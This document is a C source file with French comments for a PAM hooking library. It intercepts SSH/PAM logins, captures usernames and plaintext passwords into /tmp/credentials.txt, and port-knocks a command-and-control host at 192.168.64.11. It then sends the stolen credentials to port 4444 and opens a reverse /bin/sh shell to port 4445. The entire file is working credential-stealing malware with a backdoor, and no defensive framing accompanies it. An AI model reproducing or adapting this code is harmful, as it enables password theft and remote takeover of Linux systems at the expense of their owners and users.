#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <syslog.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

// Fonctions PAM d'origine
typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

// Config
#define CREDENTIALS_FILE   "/tmp/credentials.txt"
#define REMOTE_HOST        "192.168.64.11"  // IP de ton C2
#define KNOCK_PORT1        5001
#define KNOCK_PORT2        5002
#define KNOCK_PORT3        5003
#define CREDENTIALS_PORT   4444
#define SHELL_PORT         4445

// Obtenir l'heure
static const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

// Écriture dans /tmp/credentials.txt
static void write_to_file(const char *type, const char *data) {
    FILE *file = fopen(CREDENTIALS_FILE, "a");
    if (!file) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s : %m", CREDENTIALS_FILE);
        return;
    }
    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
    fclose(file);
}

// Port knocking (TCP connect "rapide")
static int port_knock(const char *ip, int port) {
    int sock;
    struct sockaddr_in srv;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] port_knock: socket : %m");
        return -1;
    }
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);

    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        // "Connection refused" est normal si le port n'est pas ouvert
        syslog(LOG_ERR, "[ERROR] port_knock: connexion %s:%d échouée : %m", ip, port);
    } else {
        syslog(LOG_INFO, "[INFO] Knock réussi sur %s:%d", ip, port);
    }
    close(sock);
    return 0;
}

// Envoie le fichier local sur le port remote_port
static void send_file_tcp(const char *ip, int remote_port) {
    int sock;
    struct sockaddr_in srv;
    char buffer[1024];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] send_file_tcp: socket : %m");
        return;
    }

    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(remote_port);
    inet_pton(AF_INET, ip, &srv.sin_addr);

    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        syslog(LOG_ERR, "[ERROR] Échec connexion %s:%d : %m", ip, remote_port);
        close(sock);
        return;
    }

    FILE *f = fopen(CREDENTIALS_FILE, "r");
    if (!f) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour l'envoi", CREDENTIALS_FILE);
        close(sock);
        return;
    }

    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        if (send(sock, buffer, bytes_read, 0) < 0) {
            syslog(LOG_ERR, "[ERROR] Échec envoi data : %m");
            fclose(f);
            close(sock);
            return;
        }
    }

    fclose(f);
    close(sock);
    syslog(LOG_INFO, "[INFO] Fichier %s envoyé à %s:%d", CREDENTIALS_FILE, ip, remote_port);
}

// Pour exécuter le reverse shell
static void launch_reverse_shell(const char *ip, int port) {
    pid_t pid = fork();
    if (pid == 0) {
        // Enfant => on ne bloque pas le process pam/sshd
        int s = socket(AF_INET, SOCK_STREAM, 0);

        struct sockaddr_in srv;
        memset(&srv, 0, sizeof(srv));
        srv.sin_family = AF_INET;
        srv.sin_port   = htons(port);
        inet_pton(AF_INET, ip, &srv.sin_addr);

        connect(s, (struct sockaddr *)&srv, sizeof(srv));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        execl("/bin/sh", "sh", NULL);
        _exit(0);
    }
}

// --------------------------------------------------------------
// Intercepteurs PAM
// --------------------------------------------------------------
static pam_get_user_t original_pam_get_user = NULL;
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "[ERROR] pam_get_user: dlsym : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    int retval = original_pam_get_user(pamh, user, prompt);
    if (retval == PAM_SUCCESS && *user) {
        write_to_file("Login", *user);
    }
    return retval;
}

static pam_get_item_t original_pam_get_item = NULL;
int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "[ERROR] pam_get_item: dlsym : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    int retval = original_pam_get_item(pamh, item_type, item);
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
        // On chope le mot de passe
        write_to_file("Mot de passe", (const char *)*item);

        // 1) Knocks
        port_knock(REMOTE_HOST, KNOCK_PORT1);
        sleep(1);
        port_knock(REMOTE_HOST, KNOCK_PORT2);
        sleep(1);
        port_knock(REMOTE_HOST, KNOCK_PORT3);
        sleep(1);

        // 2) Envoi du fichier sur 4444
        send_file_tcp(REMOTE_HOST, CREDENTIALS_PORT);

        // 3) Reverse shell vers 4445
        launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
    }

    return retval;
}

